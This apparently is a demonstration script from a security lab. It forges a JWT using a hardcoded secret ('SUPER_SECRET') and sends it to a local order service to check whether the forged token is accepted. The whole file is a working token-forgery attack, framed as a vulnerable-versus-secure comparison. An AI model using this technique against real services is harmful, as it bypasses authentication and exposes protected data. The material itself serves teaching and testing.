/**
 * ATTACK 1: Token Forgery
 * Demonstrates forging a JWT using the hardcoded secret.
 * Only works against the VULNERABLE service.
 */

const jwt = require("jsonwebtoken");
const http = require("http");

// ATTACKER knows/guessed the hardcoded secret
const KNOWN_SECRET = "SUPER_SECRET";

// Forge a token impersonating a legitimate service
const forgedToken = jwt.sign(
  {
    typ: "service",
    service: "attacker"          // Attacker-controlled identity
  },
  KNOWN_SECRET                   // Hardcoded secret used directly
);

console.log("\n=== ATTACK 1: TOKEN FORGERY ===");
console.log("[*] Forged JWT token generated:");
console.log(forgedToken);
console.log("\n[*] Sending forged token to Order Service...\n");

// Send forged token to order-service
const options = {
  hostname: "localhost",
  port: 4000,
  path: "/orders",
  method: "GET",
  headers: {
    Authorization: `Bearer ${forgedToken}`
  }
};

const req = http.request(options, (res) => {
  let data = "";
  res.on("data", (chunk) => (data += chunk));
  res.on("end", () => {
    if (res.statusCode === 200) {
      console.log("[!] SUCCESS - Forged token accepted! Protected data received:");
      console.log(data);
      console.log("\n[RESULT] VULNERABLE: System accepted a forged token");
    } else {
      console.log(`[+] BLOCKED - Status: ${res.statusCode}`);
      console.log(`[+] Response: ${data}`);
      console.log("\n[RESULT] SECURE: Forged token was rejected");
    }
  });
});

req.on("error", (err) => {
  console.log("[ERROR] Could not connect:", err.message);
  console.log("Make sure the order-service is running on port 4000");
});

req.end();
